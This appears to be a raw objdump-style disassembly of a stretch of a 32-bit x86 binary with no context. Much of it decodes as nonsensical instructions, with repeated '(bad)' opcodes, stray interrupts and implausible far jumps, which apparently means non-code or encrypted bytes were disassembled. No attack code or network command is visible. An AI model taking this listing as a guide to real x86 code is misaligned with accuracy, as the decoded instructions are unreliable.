  426a42:	mov    ebp,0xd3f03b92
  426a47:	repnz sub BYTE PTR [ebx-0x2d],dl
  426a4b:	jo     0x426a1c
  426a4d:	push   es
  426a4e:	and    al,0x0
  426a50:	add    BYTE PTR [eax],al
  426a52:	jo     0x426a21
  426a54:	jbe    0x426a6a
  426a56:	rol    BYTE PTR [eax+0x76cdf100],0x4c
  426a5d:	int    0x8d
  426a5f:	dec    esp
  426a60:	cmp    edi,DWORD PTR [ecx+0x3b]
  426a63:	lock int 0xe6
  426a66:	mov    bl,dl
  426a68:	mov    ebp,0x28f2d392
  426a6d:	push   ebx
  426a6e:	ror    edi,cl
  426a70:	iret   
  426a71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426a72:	inc    DWORD PTR [eax]
  426a74:	add    BYTE PTR [edx],cl
  426a76:	int3   
  426a77:	push   es
  426a78:	sbb    eax,0xcf0000ff
  426a7d:	jbe    0x426aa4
  426a7f:	mov    ebp,0xeff5
  426a84:	int    0x8d
  426a86:	xor    ch,cl
  426a88:	xchg   esi,eax
  426a89:	xor    BYTE PTR [ebx],bh
  426a8b:	psrlq  mm5,mm3
  426a8e:	xchg   edx,eax
  426a8f:	add    al,0xfb
  426a91:	call   ebx
  426a93:	jmp    0xcf05:0xa135328
  426a9a:	sbb    eax,0x610000ff
  426a9f:	sub    esi,DWORD PTR ds:0x6a5d8080
  426aa5:	xor    eax,0xab88080
  426aaa:	push   es
  426aab:	jo     0x426aad
  426aad:	add    BYTE PTR [eax],al
  426aaf:	iret   
  426ab0:	mov    dh,BYTE PTR [eax]
  426ab2:	mov    eax,0xb4cf0a
  426ab7:	add    BYTE PTR [eax],al
  426ab9:	pop    ebp
  426aba:	adc    BYTE PTR ds:0xab88080,dh
  426ac0:	push   es
  426ac1:	bound  eax,QWORD PTR [eax]
  426ac3:	add    BYTE PTR [eax],al
  426ac5:	int    0xd2
  426ac7:	mov    eax,0x94060a
  426acc:	add    BYTE PTR [eax],al
  426ace:	int    0xd3
  426ad0:	mov    eax,0x98060a
  426ad5:	add    BYTE PTR [eax],al
  426ad7:	add    al,0x6d
  426ad9:	sub    ch,cl
  426adb:	jge    0x426a95
  426add:	or     cl,bh
  426adf:	mov    eax,0xcf000000
  426ae4:	mov    ch,BYTE PTR [eax]
  426ae6:	mov    eax,0xbccf0a
  426aeb:	add    BYTE PTR [eax],al
  426aed:	add    al,0xd3
  426aef:	pusha  
  426af0:	mov    eax,0xc0cf0a
  426af5:	add    BYTE PTR [eax],al
  426af7:	iret   
  426af8:	mov    cl,BYTE PTR [edx-0x48]
  426afb:	or     cl,bh
  426afd:	les    eax,FWORD PTR [eax]
  426aff:	add    BYTE PTR [eax],al
  426b01:	int    0xf9
  426b03:	mov    eax,0x9c670a
  426b08:	add    BYTE PTR [eax],al
  426b0a:	iret   
  426b0b:	loopne 0x426aad
  426b0d:	pop    edi
  426b0e:	add    BYTE PTR ds:0xab88080,dh
  426b14:	iret   
  426b15:	enter  0x0,0x0
  426b19:	iret   
  426b1a:	mov    bh,bh
  426b1c:	mov    eax,0x90cf0a
  426b21:	add    BYTE PTR [eax],al
  426b23:	mov    eax,0xa0670a
  426b28:	add    BYTE PTR [eax],al
  426b2a:	add    al,0xc9
  426b2c:	stc    
  426b2d:	mov    eax,0xa4670a
  426b32:	add    BYTE PTR [eax],al
  426b34:	int    0xf9
  426b36:	pop    edi
  426b37:	leave  
  426b38:	xor    eax,0xab88080
  426b3d:	iret   
  426b3e:	add    BYTE PTR [eax],0x0
  426b41:	add    ch,cl
  426b43:	jge    0x426afd
  426b45:	or     cl,bh
  426b47:	aam    0x0
  426b49:	add    BYTE PTR [eax],al
  426b4b:	int    0xc5
  426b4d:	mov    eax,0xe0060a
  426b52:	add    BYTE PTR [eax],al
  426b54:	cmp    ebp,DWORD PTR [ebp-0x48]
  426b57:	or     ah,BYTE PTR [edi-0x58]
  426b5a:	add    BYTE PTR [eax],al
  426b5c:	add    bh,cl
  426b5e:	addr16 in al,0x0
  426b61:	add    BYTE PTR [eax],al
  426b63:	leave  
  426b64:	push   es
  426b65:	lods   al,BYTE PTR ds:[esi]
  426b66:	add    BYTE PTR [eax],al
  426b68:	add    dh,ah
  426b6a:	xor    eax,0x6c9352b
  426b6f:	fadd   DWORD PTR [eax]
  426b71:	add    BYTE PTR [eax],al
  426b73:	jae    0x426baa
  426b75:	jno    0x426bac
  426b77:	mov    eax,0x3076cdaf
  426b7c:	int    0x8d
  426b7e:	xor    ch,cl
  426b80:	xchg   esi,eax
  426b81:	xor    BYTE PTR [edx+eax*1],al
  426b84:	call   ebx
  426b86:	repnz sub BYTE PTR [ebx],bh
  426b89:	jns    0x426b5e
  426b8b:	mov    ebp,0xcdd35392
  426b90:	lea    esi,[eax]
  426b92:	add    al,0x2
  426b94:	(bad)  
  426b95:	cmp    ebx,DWORD PTR [ecx-0x2cd70d2d]
  426b9b:	repz xchg edx,eax
  426b9d:	push   ebx
  426b9e:	jecxz  0x426bdb
  426ba0:	retf   
  426ba1:	add    al,0xd2
  426ba3:	sbb    bl,BYTE PTR [ebx]
  426ba5:	retf   
  426ba6:	cmp    eax,DWORD PTR [eax]
  426ba8:	inc    ebx
  426ba9:	cli    
  426baa:	das    
  426bab:	or     cl,dl
  426bad:	add    BYTE PTR [eax+0x43888280],0xd2
  426bb4:	das    
  426bb5:	add    al,0x37
  426bb7:	add    BYTE PTR [eax+0x308dcd80],0xcd
  426bbe:	xchg   esi,eax
  426bbf:	xor    BYTE PTR [ebx],bh
  426bc1:	psrlq  mm5,mm3
  426bc4:	xchg   edx,eax
  426bc5:	add    al,0xfb
  426bc7:	call   ebx
  426bc9:	jmp    0xcd7d:0x87135328
  426bd0:	aad    0xb8
  426bd2:	cmp    edx,DWORD PTR ds:0x708d
  426bd8:	add    ch,cl
  426bda:	lea    esi,[eax]
  426bdc:	int    0xe6
  426bde:	xor    BYTE PTR [ebx],bh
  426be0:	psrlq  mm5,mm3
  426be3:	xchg   edx,eax
  426be4:	add    al,0xf8
  426be6:	call   ebx
  426be8:	jmp    0x8832bf15
  426bed:	jge    0x426ba7
  426bef:	int    0xcc
  426bf1:	lea    esi,[eax+0x0]
  426bf4:	add    BYTE PTR [eax],al
  426bf6:	mov    eax,0xd3b8e3f8
  426bfb:	repnz das 
  426bfd:	mov    eax,0x53b8f3e3
  426c02:	jecxz  0x426bd1
  426c04:	lea    esi,[eax]
  426c06:	int    0xe6
  426c08:	xor    BYTE PTR [ebx],bh
  426c0a:	psrlq  mm5,mm3
  426c0d:	xchg   edx,eax
  426c0e:	add    al,0xf8
  426c10:	call   ebx
  426c12:	jmp    0x8832bf3f
  426c17:	jge    0x426bd1
  426c19:	or     dl,BYTE PTR ds:0x708d
  426c1f:	add    ch,cl
  426c21:	lea    esi,[eax]
  426c23:	int    0x96
  426c25:	xor    BYTE PTR [ebx],bh
  426c27:	(bad)  
  426c29:	sti    
  426c2a:	call   ebx
  426c2c:	jmp    0x426bc0
  426c2e:	shr    edx,cl
  426c30:	sub    BYTE PTR [ebx+0x13],dl
  426c33:	int    0x96
  426c35:	xor    BYTE PTR [edi+0x308dcdd3],al
  426c3b:	add    al,0x2
  426c3d:	(bad)  
  426c3e:	cmp    ebx,DWORD PTR [ecx-0x2cd70d2d]
  426c44:	repz xchg edx,eax
  426c46:	push   ebx
  426c47:	jecxz  0x426c84
  426c49:	retf   
  426c4a:	add    al,0xd2
  426c4c:	sbb    bl,BYTE PTR [ebx]
  426c4e:	retf   
  426c4f:	cmp    eax,DWORD PTR [eax]
  426c51:	inc    ebx
  426c52:	cli    
  426c53:	das    
  426c54:	or     ebp,DWORD PTR [esi+0x2f000000]
  426c5a:	pop    es
  426c5b:	pop    ebx
  426c5c:	add    BYTE PTR [eax],al
  426c5e:	add    bl,al
  426c60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426c61:	mov    esi,0x76cf4229
  426c66:	jne    0x426c72
  426c68:	jbe    0x426bf2
  426c6a:	int    0x76
  426c6c:	mov    BYTE PTR [edi+0x13de37b6],bh
  426c72:	or     bl,BYTE PTR [ecx+ecx*8]
  426c75:	ins    BYTE PTR es:[edi],dx
  426c76:	test   BYTE PTR [ebp-0x32dadcf6],bh
  426c7c:	jbe    0x426cf3
  426c7e:	int    0x8d
  426c80:	jge    0x426cb1
  426c82:	inc    ebp
  426c83:	jge    0x426c17
  426c85:	shr    ebx,cl
  426c87:	xchg   edx,eax
  426c88:	int    0x8d
  426c8a:	jne    0x426c59
  426c8c:	xchg   esi,eax
  426c8d:	jge    0x426cca
  426c8f:	leave  
  426c90:	cmp    ebx,edx
  426c92:	push   ebx
  426c93:	icebp  
  426c94:	int    0x76
  426c96:	cmc    
  426c97:	bound  eax,QWORD PTR [ebp-0x7f7f7edb]
  426c9d:	jo     0x426c6e
  426c9f:	push   es
  426ca0:	cmc    
  426ca1:	inc    DWORD PTR [eax]
  426ca3:	add    BYTE PTR [eax-0x2d],dh
  426ca6:	repnz sub BYTE PTR [ebp+0xf2a3],bh
  426cad:	int    0x76
  426caf:	in     eax,dx
  426cb0:	int    0x8d
  426cb2:	adc    DWORD PTR [edi],ebp
  426cb4:	inc    ebp
  426cb5:	jge    0x426c49
  426cb7:	shr    ebx,cl
  426cb9:	xchg   edx,eax
  426cba:	int    0x8d
  426cbc:	in     eax,dx
  426cbd:	int    0x96
  426cbf:	adc    ebx,edx
  426cc1:	repnz sub ch,cl
  426cc4:	iret   
  426cc5:	cmc    
  426cc6:	inc    DWORD PTR [eax]
  426cc8:	add    ch,cl
  426cca:	mov    DWORD PTR [ebx],edi
  426ccc:	leave  
  426ccd:	cmp    ebx,edx
  426ccf:	push   ebx
  426cd0:	rol    BYTE PTR [ebx+0x7d],cl
  426cd3:	das    
  426cd4:	push   es
  426cd5:	push   ebp
  426cd6:	add    BYTE PTR [eax-0xa293280],0xc9
  426cdd:	jbe    0x426cec
  426cdf:	(bad)  
  426ce0:	ficom  WORD PTR ss:[ebx]
  426ce3:	pop    ebp
  426ce4:	mov    ebp,0xa25230a
  426ce9:	jbe    0x426cdc
  426ceb:	or     ah,BYTE PTR [esi-0x6289f56b]
  426cf1:	int    0x76
  426cf3:	xchg   ebp,eax
  426cf4:	int    0x8d
  426cf6:	popf   
  426cf7:	das    
  426cf8:	inc    ebp
  426cf9:	jge    0x426c8d
  426cfb:	shr    ebx,cl
  426cfd:	xchg   edx,eax
  426cfe:	int    0x8d
  426d00:	xchg   ebp,eax
  426d01:	int    0x96
  426d03:	popf   
  426d04:	cmp    ecx,ecx
  426d06:	cmp    ebx,edx
  426d08:	push   ebx
  426d09:	icebp  
  426d0a:	bound  eax,QWORD PTR [eax]
  426d0c:	(bad)  
  426d0d:	xor    al,0xd3
  426d0f:	repnz sub BYTE PTR [eax],al
  426d12:	pop    ecx
  426d13:	xor    eax,0xbd808081
  426d18:	push   eax
  426d19:	repnz add BYTE PTR [eax],al
  426d1c:	int    0x76
  426d1e:	xchg   ebp,eax
  426d1f:	int    0x8d
  426d21:	popf   
  426d22:	das    
  426d23:	inc    ebp
  426d24:	jge    0x426cb8
  426d26:	shr    ebx,cl
  426d28:	xchg   edx,eax
  426d29:	int    0x8d
  426d2b:	xchg   ebp,eax
  426d2c:	int    0x96
  426d2e:	popf   
  426d2f:	cmp    ecx,ecx
  426d31:	cmp    ebx,edx
  426d33:	push   ebx
  426d34:	icebp  
  426d35:	bound  eax,QWORD PTR [eax]
  426d37:	pop    ecx
  426d38:	xor    eax,0xd3808081
  426d3d:	repnz sub BYTE PTR [eax],al
  426d40:	pop    ecx
  426d41:	sub    eax,0xbd808081
  426d46:	xchg   edx,eax
  426d47:	repnz add BYTE PTR [eax],al
  426d4a:	int    0x7
  426d4c:	xor    eax,0xcd808081
  426d51:	mov    ch,cl
  426d53:	jle    0x426db9
  426d55:	xchg   DWORD PTR [eax-0x327772f6],ecx
  426d5b:	lea    ecx,ds:0x2ff176cd
  426d61:	inc    ebp
  426d62:	rcl    DWORD PTR [edx-0x326d422d],cl
  426d68:	jbe    0x426d77
  426d6a:	int    0x96
  426d6c:	icebp  
  426d6d:	cmp    esi,eax
  426d6f:	shr    DWORD PTR [ebp+0x536d3b28],cl
  426d75:	ror    ebp,cl
  426d77:	lea    ecx,[eax+0x187ebb2f]
  426d7d:	push   es
  426d7e:	jge    0x426d54
  426d80:	dec    esp
  426d81:	int    0x7
  426d83:	popf   
  426d84:	add    DWORD PTR [eax+0x4180c980],0xcd358621
  426d8e:	jbe    0x426ddc
  426d90:	int    0x76
  426d92:	xor    BYTE PTR [eax],al
  426d94:	(bad)  
  426d95:	cmp    al,0x0
  426d97:	(bad)  
  426d98:	cmc    
  426d99:	add    dh,dl
  426d9b:	sub    al,0x0
  426d9d:	(bad)  
  426d9e:	and    al,0x0
  426da0:	(bad)  
  426da1:	sbb    al,0x0
  426da3:	(bad)  
  426da4:	adc    al,0xbd
  426da6:	test   ch,dh
  426da8:	add    BYTE PTR [eax],al
  426daa:	or     al,BYTE PTR [esi]
  426dac:	adc    edi,edi
  426dae:	add    BYTE PTR [eax],al
  426db0:	int    0x76
  426db2:	cmp    al,0x4
  426db4:	fcom   QWORD PTR [eax+eax*4]
  426db7:	aam    0x1a
  426db9:	int    0x76
  426dbb:	cmp    al,0x4
  426dbd:	fsub   QWORD PTR [eax+eax*4]
  426dc0:	aam    0x4e
  426dc2:	int    0x6
  426dc4:	adc    edi,edi
  426dc6:	add    BYTE PTR [eax],al
  426dc8:	int    0x8d
  426dca:	cmp    al,0xa
  426dcc:	outs   dx,BYTE PTR ds:[esi]
  426dcd:	sbb    al,0xec
  426dcf:	push   ebx
  426dd0:	add    dh,dl
  426dd2:	cmp    al,0x0
  426dd4:	(bad)  
  426dd5:	cmc    
  426dd6:	mov    ebp,0x6daa
  426ddb:	stos   BYTE PTR es:[edi],al
  426ddc:	test   al,0x63
  426dde:	retf   
  426ddf:	shl    BYTE PTR [eax+eax*4],cl
  426de2:	xchg   esi,eax
  426de3:	int    0xed
  426de5:	jno    0x426e58
  426de7:	cwde   
  426de8:	leave  
  426de9:	jbe    0x426de8
  426deb:	dec    ecx
  426dec:	and    DWORD PTR [esi-0x68936cb],eax
  426df2:	inc    ecx
  426df3:	and    DWORD PTR [esi-0x28932cb],eax
  426df9:	int    0xd6
  426dfb:	std    
  426dfc:	sar    bh,0x5f
  426dff:	shl    DWORD PTR [ecx],1
  426e01:	xchg   BYTE PTR ds:0x3ba0d33b,dh
  426e07:	sti    
  426e08:	sar    DWORD PTR [ebp+0x28b9d392],cl
  426e0e:	push   ebx
  426e0f:	jns    0x426dde
  426e11:	(bad)  
  426e12:	mov    BYTE PTR [ebx+0x11],al
  426e15:	int    0x76
  426e17:	std    
  426e18:	aam    0xc4
  426e1a:	int    0xd6
  426e1c:	std    
  426e1d:	cmp    edx,ebx
  426e1f:	cmp    edi,ebx
  426e21:	sar    DWORD PTR [ecx-0x6d422cd8],cl
  426e27:	push   ebx
  426e28:	jns    0x426df7
  426e2a:	(bad)  
  426e2b:	dec    esp
  426e2c:	inc    ebx
  426e2d:	adc    esp,edx
  426e2f:	pop    ebx
  426e30:	int    0x96
  426e32:	xor    BYTE PTR [edx-0x32b31933],bl
  426e38:	jbe    0x426dc2
  426e3a:	cmp    esi,edi
  426e3c:	push   es
  426e3d:	add    ah,dl
  426e3f:	push   esi
  426e40:	pop    ebx
  426e41:	retf   0x8624
  426e44:	or     DWORD PTR [esi-0x59a6d0d1],esp
  426e4a:	das    
  426e4b:	push   es
  426e4c:	fcmovbe st,st(6)
  426e4e:	dec    esi
  426e4f:	add    al,0xf4
  426e51:	adc    DWORD PTR [edx],0xffffffc5
  426e54:	fwait
  426e55:	add    BYTE PTR [eax+0x2fa60980],0xec
  426e5c:	dec    esp
  426e5d:	adc    ch,ah
  426e5f:	in     eax,dx
  426e60:	add    BYTE PTR [eax+0x2fa60980],0xf1
  426e67:	lea    ebp,[edi]
  426e69:	retf   0x2fa6
  426e6c:	or     DWORD PTR [esi+eax*4],esp
  426e6f:	js     0x426eb4
  426e71:	clc    
  426e72:	or     BYTE PTR [esi],0x63
  426e75:	int    0x76
  426e77:	stc    
  426e78:	cmp    edx,ebx
  426e7a:	int    0x8d
  426e7c:	stc    
  426e7d:	add    al,0x2
  426e7f:	jmp    FWORD PTR [edx+0x76cd4aec]
  426e85:	std    
  426e86:	cmp    edx,ebx
  426e88:	int    0x8d
  426e8a:	std    
  426e8b:	cmp    edx,DWORD PTR [ebx]
  426e8d:	shl    edx,cl
  426e8f:	sub    bl,dl
  426e91:	mov    ebp,0xa8d35392
  426e96:	retf   
  426e97:	ror    BYTE PTR [eax+eax*4-0x6a],cl
  426e9b:	int    0xed
  426e9d:	add    al,0xed
  426e9f:	(bad)  
  426ea0:	leave  
  426ea1:	jbe    0x426ea0
  426ea3:	dec    ecx
  426ea4:	and    DWORD PTR [esi+0x21416135],eax
  426eaa:	xchg   BYTE PTR ds:0xcdf9960a,dh
  426eb0:	jbe    0x426ec6
  426eb2:	or     dh,BYTE PTR [esi+0x14]
  426eb5:	int    0x76
  426eb7:	adc    al,0xcd
  426eb9:	add    DWORD PTR ds:0xcd808081,ebp
  426ebf:	lea    edx,[ecx*8+0x2d0acd80]
  426ec6:	add    DWORD PTR [eax-0x78763280],0xa5b647c
  426ed0:	lea    esi,[ebp-0x32028933]
  426ed6:	(bad)  
  426ed7:	std    
  426ed8:	cwde   
  426ed9:	call   0x3b85:0x82cfffc0
  426ee0:	jns    0x426eb5
  426ee2:	mov    ebp,0xf03baa92
  426ee7:	shl    edx,cl
  426ee9:	sub    BYTE PTR [ebx-0x2d],dl
  426eec:	or     dh,BYTE PTR [esi-0x63]
  426eef:	int    0x76
  426ef1:	std    
  426ef2:	int    0x8d
  426ef4:	std    
  426ef5:	cmp    edi,DWORD PTR [ecx-0x2d]
  426ef8:	mov    ebp,0xd3f03b92
  426efd:	repnz sub BYTE PTR [ebx-0x2d],dl
  426f01:	or     dh,BYTE PTR [esi-0x53]
  426f04:	int    0x76
  426f06:	mov    ch,0xcd
  426f08:	ins    BYTE PTR es:[edi],dx
  426f09:	jo     0x426f0f
  426f0b:	mov    ebp,0xf1760a4c
  426f10:	int    0x76
  426f12:	mov    ch,0xcd
  426f14:	ins    BYTE PTR es:[edi],dx
  426f15:	pop    esp
  426f16:	int    0x8d
  426f18:	mov    ch,0x7c
  426f1a:	push   es
  426f1b:	outs   dx,BYTE PTR ds:[esi]
  426f1c:	xchg   esp,eax
  426f1d:	int    0x76
  426f1f:	mov    ch,0xd4
  426f21:	sbb    al,0xcd
  426f23:	ins    BYTE PTR es:[edi],dx
  426f24:	pop    esp
  426f25:	int    0x8d
  426f27:	mov    ch,0xcd
  426f29:	jle    0x426ebf
  426f2b:	jl     0x426f25
  426f2d:	icebp  
  426f2e:	sub    edi,DWORD PTR [ebp-0x33]
  426f31:	jbe    0x426ee8
  426f33:	int    0x6c
  426f35:	pop    esp
  426f36:	xchg   ebx,edx
  426f38:	in     al,dx
  426f39:	xchg   ebp,ecx
  426f3b:	ins    BYTE PTR es:[edi],dx
  426f3c:	xchg   esp,eax
  426f3d:	or     dh,BYTE PTR [esi-0x43]
  426f40:	int    0x76
  426f42:	std    
  426f43:	int    0x8d
  426f45:	std    
  426f46:	cmp    edi,DWORD PTR [ecx+0x3b]
  426f49:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  426f50:	push   ebx
  426f51:	ror    DWORD PTR [edx],cl
  426f53:	jbe    0x426f69
  426f55:	int    0x76
  426f57:	std    
  426f58:	int    0x8d
  426f5a:	std    
  426f5b:	cmp    edi,DWORD PTR [ecx+0x3b]
  426f5e:	lock shl edx,cl
  426f61:	sub    bl,dl
  426f63:	mov    ebp,0xad35392
  426f68:	jbe    0x426f7e
  426f6a:	int    0x76
  426f6c:	std    
  426f6d:	int    0x8d
  426f6f:	std    
  426f70:	cmp    esi,eax
  426f72:	cmp    edi,DWORD PTR [ecx-0x2d]
  426f75:	repnz sub bl,dl
  426f78:	mov    ebp,0xcdd35392
  426f7d:	lea    esi,[eax]
  426f7f:	or     al,BYTE PTR [ecx-0x36eb69f6]
  426f85:	jbe    0x426f9b
  426f87:	cmp    DWORD PTR [ecx],esp
  426f89:	xchg   BYTE PTR ds:0xb21476c9,dh
  426f8f:	and    DWORD PTR [esi+0x1476c935],eax
  426f95:	imul   esp,DWORD PTR [ecx],0x36eb3586
  426f9b:	xchg   BYTE PTR [eax-0x2893280],al
  426fa1:	int    0x8d
  426fa3:	std    
  426fa4:	cmp    edi,DWORD PTR [ecx+0x3b]
  426fa7:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  426fae:	push   ebx
  426faf:	ror    DWORD PTR [edx],cl
  426fb1:	jbe    0x426f60
  426fb3:	int    0x76
  426fb5:	mov    ebp,0xa4c7687
  426fba:	jbe    0x426f59
  426fbc:	add    dh,dl
  426fbe:	popf   
  426fbf:	add    dh,dl
  426fc1:	dec    esp
  426fc2:	int    0x8d
  426fc4:	mov    ch,0xbd
  426fc6:	neg    bh
  426fc8:	add    BYTE PTR [eax],al
  426fca:	or     dh,BYTE PTR [esi+0x14]
  426fcd:	int    0x76
  426fcf:	adc    al,0x6
  426fd1:	ins    DWORD PTR es:[edi],dx
  426fd2:	aam    0x60
  426fd4:	int    0x76
  426fd6:	popf   
  426fd7:	or     dh,BYTE PTR [esi-0x5b]
  426fda:	int    0x76
  426fdc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426fdd:	int    0x8d
  426fdf:	dec    esp
  426fe0:	xor    edx,ebx
  426fe2:	or     dh,BYTE PTR [esi-0x5b]
  426fe5:	int    0x76
  426fe7:	adc    al,0xcd
  426fe9:	lea    edx,[ecx*8+0x6e87306c]
  426ff0:	dec    esp
  426ff1:	int    0x8d
  426ff3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426ff4:	inc    ebx
  426ff5:	jge    0x426f79
  426ff7:	sbb    ch,cl
  426ff9:	jbe    0x42700f
  426ffb:	int    0x6c
  426ffd:	dec    esp
  426ffe:	int    0x8d
  427000:	adc    al,0x87
  427002:	outs   dx,BYTE PTR ds:[esi]
  427003:	mov    ch,cl
  427005:	lea    esp,[ebp-0x2e142ccd]
  42700b:	test   DWORD PTR [eax+0x2149bf80],eax
  427011:	xchg   BYTE PTR ds:0xc90da60a,dh
  427017:	jbe    0x427096
  427019:	inc    ecx
  42701a:	and    DWORD PTR [esi+0x7576c935],eax
  427020:	cmp    DWORD PTR [ecx],esp
  427022:	xchg   BYTE PTR ds:0xb26d76c9,dh
  427028:	and    DWORD PTR [esi+0xd76cf35],eax
  42702e:	or     dh,BYTE PTR [esi-0xb]
  427031:	iret   
  427032:	jbe    0x4270b1
  427034:	or     dh,BYTE PTR [esi+0x11]
  427037:	iret   
  427038:	jbe    0x4270af
  42703a:	or     dh,BYTE PTR [esi+0x14]
  42703d:	iret   
  42703e:	jbe    0x4270ad
  427040:	or     dh,BYTE PTR [esi-0x13]
  427043:	int    0x76
  427045:	std    
  427046:	int    0x8d
  427048:	std    
  427049:	cmp    edi,DWORD PTR [ecx+0x3b]
  42704c:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  427053:	push   ebx
  427054:	ror    DWORD PTR [edx],cl
  427056:	jbe    0x426ffd
  427058:	jmp    0x42706d
  42705a:	xchg   DWORD PTR [eax-0x4d03ed80],eax
  427060:	and    DWORD PTR [esi-0x22fad0cb],eax
  427066:	xchg   DWORD PTR [eax+0x4cc080],eax
  42706c:	(bad)  
  42706d:	popf   
  42706e:	iret   
  42706f:	jbe    0x427041
  427071:	jo     0x427030
  427073:	xlat   BYTE PTR ds:[ebx]
  427074:	fild   WORD PTR [eax]
  427076:	add    ch,cl
  427078:	jbe    0x427073
  42707a:	int    0x8d
  42707c:	stc    
  42707d:	cmp    edi,DWORD PTR [ecx+0x3b]
  427080:	lock shl edx,cl
  427083:	sub    bl,dl
  427085:	mov    ebp,0xad35392
  42708a:	jbe    0x427039
  42708c:	or     ah,BYTE PTR [esi-0x6a29ae6b]
  427092:	int    0x76
  427094:	xchg   ebp,eax
  427095:	sar    DWORD PTR [ebp-0x2c1ec46e],cl
  42709b:	in     eax,0x28
  42709d:	push   ebx
  42709e:	popf   
  42709f:	or     ah,BYTE PTR [esi-0x689325b]
  4270a5:	int    0x8d
  4270a7:	stc    
  4270a8:	cmp    esi,eax
  4270aa:	shl    edx,cl
  4270ac:	sub    BYTE PTR [ebx],bh
  4270ae:	jns    0x427083
  4270b0:	mov    ebp,0xcdd35392
  4270b5:	(bad)  
  4270b6:	stc    
  4270b7:	int    0x96
  4270b9:	stc    
  4270ba:	cmp    ecx,DWORD PTR [edi]
  4270bc:	cmp    ebx,ecx
  4270be:	shr    ebx,cl
  4270c0:	xchg   edx,eax
  4270c1:	shr    edx,cl
  4270c3:	sub    BYTE PTR [ebx+0x13],dl
  4270c6:	xchg   ebx,edx
  4270c8:	int    0x8d
  4270ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4270cb:	or     ah,BYTE PTR [esi-0x2982bc9b]
  4270d1:	sub    ch,cl
  4270d3:	jbe    0x4270ce
  4270d5:	int    0x8d
  4270d7:	stc    
  4270d8:	cmp    edi,DWORD PTR [ecx+0x3b]
  4270db:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  4270e2:	push   ebx
  4270e3:	shl    DWORD PTR [eax-0x40],cl
  4270e6:	dec    esp
  4270e7:	iret   
  4270e8:	jbe    0x4270ba
  4270ea:	jo     0x4270a9
  4270ec:	sti    
  4270ed:	std    
  4270ee:	add    BYTE PTR [eax],al
  4270f0:	int    0x76
  4270f2:	std    
  4270f3:	int    0x8d
  4270f5:	std    
  4270f6:	cmp    edi,DWORD PTR [ecx+0x3b]
  4270f9:	lock shl edx,cl
  4270fc:	sub    bl,dl
  4270fe:	mov    ebp,0xcdd35392
  427103:	lea    esp,[ebp+0x28d47d43]
  427109:	int    0x76
  42710b:	std    
  42710c:	int    0x8d
  42710e:	std    
  42710f:	cmp    edi,DWORD PTR [ecx+0x3b]
  427112:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  427119:	push   ebx
  42711a:	shl    DWORD PTR [eax-0x40],cl
  42711d:	dec    esp
  42711e:	iret   
  42711f:	jbe    0x4270f1
  427121:	jo     0x4270e0
  427123:	mov    edi,0xcd0000fd
  427128:	jbe    0x42711f
  42712a:	int    0x8d
  42712c:	cmc    
  42712d:	int    0x89
  42712f:	int    0x80
  427131:	cmp    esi,eax
  427133:	cmp    edi,DWORD PTR [ecx-0x2d]
  427136:	repnz sub bl,dl
  427139:	mov    ebp,0xcad35392
  42713e:	je     0x4270c5
  427140:	ror    ch,1
  427142:	(bad)  
  427143:	std    
  427144:	int    0x96
  427146:	std    
  427147:	cmp    ecx,DWORD PTR [edi]
  427149:	cmp    ebx,ecx
  42714b:	shr    ebx,cl
  42714d:	xchg   edx,eax
  42714e:	shr    edx,cl
  427150:	sub    BYTE PTR [edi],ch
  427152:	pop    ecx
  427153:	ins    DWORD PTR es:[edi],dx
  427154:	push   ebx
  427155:	adc    eax,DWORD PTR [ebx-0x2d]
  427158:	das    
  427159:	add    eax,0x80809212
  42715e:	int    0x76
  427160:	adc    ebp,ecx
  427162:	lea    edx,[ecx]
  427164:	int    0x89
  427166:	int    0x80
  427168:	cmp    esi,eax
  42716a:	cmp    edi,DWORD PTR [ecx-0x2d]
  42716d:	repnz sub bl,dl
  427170:	mov    ebp,0xcad35392
  427175:	je     0x4270fc
  427177:	ror    ch,1
  427179:	(bad)  
  42717a:	std    
  42717b:	int    0x96
  42717d:	std    
  42717e:	cmp    ecx,DWORD PTR [edi]
  427180:	cmp    ebx,ecx
  427182:	shr    ebx,cl
  427184:	xchg   edx,eax
  427185:	shr    edx,cl
  427187:	sub    BYTE PTR [edi],ch
  427189:	pop    ecx
  42718a:	ins    DWORD PTR es:[edi],dx
  42718b:	push   ebx
  42718c:	adc    eax,DWORD PTR [ebx-0x2d]
  42718f:	das    
  427190:	add    eax,0x8080928a
  427195:	int    0x76
  427197:	adc    al,0xcd
  427199:	lea    edx,[ecx*8+0x3b80cd89]
  4271a0:	lock cmp edi,DWORD PTR [ecx-0x2d]
  4271a4:	repnz sub bl,dl
  4271a7:	mov    ebp,0xcad35392
  4271ac:	je     0x427133
  4271ae:	ror    ch,1
  4271b0:	(bad)  
  4271b1:	std    
  4271b2:	int    0x96
  4271b4:	std    
  4271b5:	cmp    ecx,DWORD PTR [edi]
  4271b7:	cmp    ebx,ecx
  4271b9:	shr    ebx,cl
  4271bb:	xchg   edx,eax
  4271bc:	shr    edx,cl
  4271be:	sub    BYTE PTR [edi],ch
  4271c0:	pop    ecx
  4271c1:	ins    DWORD PTR es:[edi],dx
  4271c2:	push   ebx
  4271c3:	adc    eax,DWORD PTR [ebx-0x2d]
  4271c6:	das    
  4271c7:	add    eax,0x8080921b
  4271cc:	int    0x76
  4271ce:	in     eax,dx
  4271cf:	int    0x8d
  4271d1:	in     eax,dx
  4271d2:	int    0x89
  4271d4:	int    0x80
  4271d6:	cmp    esi,eax
  4271d8:	cmp    edi,DWORD PTR [ecx-0x2d]
  4271db:	repnz sub bl,dl
  4271de:	mov    ebp,0xcad35392
  4271e3:	je     0x42716a
  4271e5:	ror    ch,1
  4271e7:	(bad)  
  4271e8:	std    
  4271e9:	int    0x96
  4271eb:	std    
  4271ec:	cmp    ecx,DWORD PTR [edi]
  4271ee:	cmp    ebx,ecx
  4271f0:	shr    ebx,cl
  4271f2:	xchg   edx,eax
  4271f3:	shr    edx,cl
  4271f5:	sub    BYTE PTR [edi],ch
  4271f7:	pop    ecx
